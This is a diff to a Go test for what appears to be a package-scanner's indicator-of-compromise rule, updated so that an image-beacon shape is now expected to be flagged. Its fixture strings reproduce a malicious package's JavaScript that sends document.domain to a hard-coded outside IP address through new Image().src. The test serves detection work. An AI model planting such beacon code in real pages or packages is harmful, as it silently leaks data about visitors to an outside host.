@@ -7,11 +7,10 @@ import "testing"
 // to http://5.189.173.113:8899/csp-edu" with document.domain as a query
 // parameter; bypass.js does the same to /csp.
 //
-// FINDING: the bare-public-IPv4 rule added for exactly this package
-// (core/iocscan/scan.go findPublicIPURL, "helpersutils-dev-tools (2026-09)")
-// counts an IP only when the same file has a send primitive netSendRE /
-// nodeSendRE recognise. `new Image().src=` is neither, so the DOCUMENTED
-// shape is not reported; only a fetch() reconstruction is.
+// The bare-public-IPv4 rule (core/iocscan/scan.go findPublicIPURL) counts an
+// IP only when the same file sends. Since v0.22.106 (F9) `new Image().src=`
+// is a recognised send, so the DOCUMENTED shape is reported, not only a
+// fetch() reconstruction.
 func TestAttack2026_56_HelpersutilsDevTools_IOC(t *testing.T) {
 	p := newIOCScanProvider()
 	image := "(function(){try{var i=new Image();i.src='http://5.189.173.113:8899/csp-edu?d='+encodeURIComponent(document.domain);}catch(e){}})();\n" +
@@ -21,8 +20,8 @@ func TestAttack2026_56_HelpersutilsDevTools_IOC(t *testing.T) {
 		"index.js":     image,
 		"bypass.js":    "(function(){new Image().src='http://5.189.173.113:8899/csp?d='+document.domain;})();\n",
 	}))
-	if documented.MaliciousIOC {
-		t.Fatalf("Image-beacon shape now detected — update the finding: %+v", documented)
+	if !documented.MaliciousIOC || documented.MaliciousIOCKind != "exfil_host" || !documented.MaliciousIOCCoupled {
+		t.Fatalf("Image-beacon shape: want coupled exfil_host MaliciousIOC, got %+v", documented)
 	}
 
 	viaFetch := atkBRun(t, p, "helpersutils-dev-tools", "1.0.11", atkBTarball(t, map[string]string{
